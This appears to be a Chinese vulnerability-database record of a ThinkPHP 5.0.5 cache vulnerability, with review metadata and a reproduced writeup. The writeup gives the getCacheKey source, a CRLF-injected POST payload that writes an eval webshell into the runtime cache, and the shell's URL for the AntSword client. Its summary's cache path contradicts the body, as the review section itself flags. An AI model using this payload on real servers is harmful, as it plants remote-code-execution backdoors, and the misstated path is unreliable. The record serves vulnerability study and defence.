---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 5.x PHP文件缓存"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.0.5 缓存漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：5.0.5样例；需缓存数据可控、可写、webroot覆盖runtime并允许PHP执行"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-c78f9e8733712a71ba48747d"
entity_id: "ve-c78f9e8733712a71ba48747d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.0.5样例；需缓存数据可控、可写、webroot覆盖runtime并允许PHP执行

代码与实验材料：给getCacheKey源码与CRLF载荷，控制器代码只在图片

来源证据范围：与520同h3art3ars原稿

- **结论使用边界（1）**：总结缓存文件路径计算错误；依据：正文正确b0/68931...，总结写b0/b068931...，重复前两位，与getCacheKey源码不符。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：默认webroot限制未说明；依据：请求/public/index.php但随后直接访问/runtime，需解释站点根在项目而不是public，否则不可达。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：缺完整控制器及结果文字；依据：只图片显示写con和连接，不能从文本确认配置。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.0.5 缓存漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Thinkphp 5.0.5

三、复现过程
------------

### 漏洞分析

-   漏洞代码与3.2.3差不多，不一样的在缓存目录

```{=html}
<!-- -->
```
-   protected function getCacheKey($name)
            {
                $name = md5($name);
                if ($this->options['cache_subdir']) {
                    // 使用子目录
                    $name = substr($name, 0, 2) . DS . substr($name, 2);
                }
                if ($this->options['prefix']) {
                    $name = $this->options['prefix'] . DS . $name;
                }
                $filename = $this->options['path'] . $name . '.php';
                $dir      = dirname($filename);
                if (!is_dir($dir)) {
                    mkdir($dir, 0755, true);
                }
                return $filename;
            }

```{=html}
<!-- -->
```
-   在index控制器写如下代码：

![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId25.png)

-   之后访问
    `http://www.0-sec.org/public/index.php/Home/index`POST数据：`con=%0aeval($_POST['cmd']);%0d//`
-   最终在
    `runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php`文件生成shell：

![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId26.png)

之后访问蚁剑
`http://www.0-sec.org/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php`

![](./.resource/Thinkphp5.0.5缓存漏洞/media/rId27.png)

### 小结

### Thinkphp5.0.5

1.  漏洞文件位置(一般审计得出)

-   `http://www.0-sec.org/public/index.php/Home/Index/index`

    POST数据 :`con=%0d%0aeval($_POST['cmd']);%0d%0a//`

2.  缓存文件位置b0文件夹是md5(cache-name)前2位。

-   `http://www.0-sec.org/runtime/cache/b0/b068931cc450442b63f5b3d276ea4297.php`

3.  蚁剑连接

参考链接
--------

> [https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/](https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10缓存漏洞/)
